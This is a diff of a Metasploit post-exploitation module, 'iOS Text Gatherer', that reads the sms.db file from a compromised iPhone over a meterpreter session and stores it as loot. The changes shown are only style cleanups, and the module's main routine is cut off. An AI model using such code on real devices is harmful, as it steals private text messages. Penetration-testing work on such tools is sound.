@@ -7,26 +7,29 @@ class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Auxiliary::Report
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'          =>  'iOS Text Gatherer',
-      'Description'   =>  %q{
-        This module collects text messages from iPhones.
-        Tested on iOS 10.3.3 on an iPhone 5.
-      },
-      'License'       =>  MSF_LICENSE,
-      'Author'        =>  [ 'Shelby Pace' ], # Metasploit Module
-      'Platform'      =>  [ 'apple_ios' ],
-      'SessionTypes'  =>  [ 'meterpreter' ]
-    ))
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'iOS Text Gatherer',
+        'Description' => %q{
+          This module collects text messages from iPhones.
+          Tested on iOS 10.3.3 on an iPhone 5.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [ 'Shelby Pace' ], # Metasploit Module
+        'Platform' => [ 'apple_ios' ],
+        'SessionTypes' => [ 'meterpreter' ]
+      )
+    )
   end
 
   def download_text_db(file_path)
     db_file_data = read_file(file_path)
     loc = store_loot('sms.db.file', 'text/plain', session, db_file_data, 'sms.db')
     print_good("sms.db stored at #{loc}")
-  rescue
-    fail_with(Failure::NoAccess, "Failed to read sms.db file")
+  rescue StandardError
+    fail_with(Failure::NoAccess, 'Failed to read sms.db file')
   end
 
   def run
